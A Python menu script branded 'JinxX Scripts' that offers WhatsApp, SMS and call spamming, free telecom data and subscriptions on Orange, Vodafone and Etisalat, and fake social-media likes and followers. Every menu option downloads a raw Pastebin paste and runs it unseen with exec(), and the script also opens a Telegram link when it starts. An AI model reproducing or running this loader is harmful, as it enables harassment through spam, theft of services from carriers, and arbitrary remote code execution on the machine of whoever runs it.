import requests
import os
import requests
import random
import pyfiglet
import string
import hashlib
from getuseragent import UserAgent
import webbrowser
asa = '123456789'
gigk = str(''.join(random.choice(asa) for i in range(10)))
joo = hashlib.md5(gigk.encode()).hexdigest()[:16]
webbrowser.open('T.me/Makavael')
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
F = '\033[2;32m'  # اخضر
C = "\033[1;97m"  # ابيض
B = '\033[2;36m'  # سمائي
Y = '\033[1;34m'  # ازرق فاتح.
C = "\033[1;97m"  # ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
red_color = '\033[1;31m'
yellow_color = '\033[1;33m'
green_color = '\033[2;32m'
white_color = '\033[1;97m'
blue_color = '\033[1;34m'
light_blue_color = '\033[2;36m'
light_green_color = '\033[1;32m'
light_yellow_color = '\033[1;33m'
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
m500 = 'https://pastebin.com/raw/w3bXfhNg'
spam = 'https://pastebin.com/raw/gGnRV9ez'
spam2 = 'https://pastebin.com/raw/7m2kXWW4'
like = 'https://pastebin.com/raw/nyeNUJDf'
views = 'https://pastebin.com/raw/7Jxs0DT9'
dvoda = 'https://pastebin.com/raw/s72fL1CK'
Etislat = 'https://pastebin.com/raw/b6w7ZQiY'
call ='https://pastebin.com/raw/QHtuhZe0'
Followers = 'https://pastebin.com/raw/JdWyj4s4'
Spotify = 'https://pastebin.com/raw/U86TkVNx'
Watchit="https://pastebin.com/raw/PxLnqpCj"
def main():
    clear_screen()
    ascii_art = pyfiglet.figlet_format('JinxX')
    mmm = pyfiglet.figlet_format('Scripts')
    print(green_color + ascii_art)
    print(light_blue_color + "Coded by: Ahmed Samir (Makavael ")
    print(Y+mmm)
    print(Z+"""
[1] 500 mega Orange
[2] spam WhatsApp 
[3] spam sms all Network 
[4] Free insta likes 
[5] Free TikTok views 
[6] Vodafone number data 
[7] Two hours of free social Etislat
[8] 3 spam calls 
[9] 125 insta followers for free 
[10] Spotify Orange subscription 
[11] Free Watchit subscription to Orange 
""")
    number = int(input(Y+"Choose the script: "))
    clear_screen()  # مسح الشاشة بعد اختيار المستخدم لرقم
    if number == 1:
        jo = m500
    elif number == 2:
        jo = spam
    elif number == 3:
        jo = spam2
    elif number == 4:
        jo = like
    elif number == 5:
        jo = views
    elif number == 6:
        jo = dvoda
    elif number == 7:
        jo = Etislat
    elif number == 8:
        jo = call
    elif number == 9:
        jo = Followers
    elif number == 10:
        jo = Spotify
    elif number == 11:
        jo = Watchit
    else:
        print("Wrong choice❌❌")
        return 

    try:
        headers = {'referer': 'https://pastebin.com'}

        response = requests.get(jo, headers)
        response.raise_for_status()
        junku = response.text
        exec(junku)
    except requests.exceptions.RequestException as e:
        print("Error❌❌")

if __name__ == "__main__":
    main()